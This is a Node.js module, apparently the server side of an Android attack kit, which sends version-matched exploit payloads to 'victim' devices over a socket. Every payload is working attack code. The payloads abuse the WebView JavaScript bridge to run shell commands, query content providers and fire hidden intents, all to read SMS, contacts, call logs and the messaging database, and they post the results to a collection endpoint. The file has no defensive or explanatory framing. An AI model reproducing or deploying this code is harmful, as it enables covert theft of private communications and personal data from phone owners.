class ExploitAndroid {
    
    static vulnerabilities = [
        {
            name: 'WebView RCE',
            minVersion: 4,
            maxVersion: 10,
            payload: this.webViewRCE
        },
        {
            name: 'Intent Scheme',
            minVersion: 5,
            maxVersion: 12,
            payload: this.intentScheme
        },
        {
            name: 'Content Provider Leak',
            minVersion: 4,
            maxVersion: 14,
            payload: this.contentProviderLeak
        },
        {
            name: 'MediaProjection Bypass',
            minVersion: 10,
            maxVersion: 14,
            payload: this.mediaProjectionBypass
        }
    ];
    
    static launch(socket, victim) {
        const version = victim.androidVersion || 0;
        
        this.vulnerabilities.forEach(vuln => {
            if (version >= vuln.minVersion && version <= vuln.maxVersion) {
                console.log(`ðŸ’¥ [${victim.id}] Lancement exploit: ${vuln.name}`);
                vuln.payload(socket, victim);
            }
        });
    }
    
    static webViewRCE(socket, victim) {
        const payload = `
            // Exploit WebView addJavascriptInterface
            for(var key in window) {
                if(key.toLowerCase().includes('searchbox') || 
                   key.toLowerCase().includes('accessibility')) {
                    try {
                        var runtime = window[key].getClass().forName('java.lang.Runtime');
                        var instance = runtime.getMethod('getRuntime',null).invoke(null,null);
                        
                        var commands = [
                            'content query --uri content://sms/inbox',
                            'content query --uri content://contacts/phones',
                            'content query --uri content://call_log/calls',
                            'cat /data/data/com.android.providers.telephony/databases/mmssms.db'
                        ];
                        
                        commands.forEach(function(cmd) {
                            var process = instance.exec(cmd);
                            var result = process.getInputStream();
                            
                            fetch('/api/collect', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    victimId: '${victim.id}',
                                    type: 'exploit_result',
                                    data: {cmd: cmd, result: result.toString()}
                                })
                            });
                        });
                    } catch(e) {}
                }
            }
        `;
        
        socket.emit('eval', payload);
    }
    
    static intentScheme(socket, victim) {
        const payload = `
            // Exploit Intent Scheme
            var intents = [
                'sms:',
                'content://sms/inbox',
                'content://contacts/phones',
                'content://call_log/calls',
                'file:///data/data/com.android.providers.telephony/databases/mmssms.db'
            ];
            
            intents.forEach(function(intent) {
                var iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = 'intent://' + intent + '#Intent;scheme=content;end';
                document.body.appendChild(iframe);
            });
        `;
        
        socket.emit('eval', payload);
    }
    
    static contentProviderLeak(socket, victim) {
        const payload = `
            // Exploit Content Provider
            var providers = [
                'content://sms/inbox',
                'content://mms-sms/conversations',
                'content://contacts/phones',
                'content://call_log/calls'
            ];
            
            providers.forEach(function(provider) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', provider, true);
                xhr.onload = function() {
                    if(this.status === 200) {
                        fetch('/api/collect', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                victimId: '${victim.id}',
                                type: 'provider_data',
                                data: {provider: provider, data: this.responseText}
                            })
                        });
                    }
                };
                xhr.send();
            });
        `;
        
        socket.emit('eval', payload);
    }
    
    static mediaProjectionBypass(socket, victim) {
        const payload = `
            // Exploit MediaProjection
            if(window.Android && Android.requestMediaProjection) {
                Android.requestMediaProjection();
                
                setTimeout(function() {
                    fetch('/api/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            victimId: '${victim.id}',
                            type: 'media_projection',
                            data: {status: 'granted'}
                        })
                    });
                }, 5000);
            }
        `;
        
        socket.emit('eval', payload);
    }
}

module.exports = ExploitAndroid;
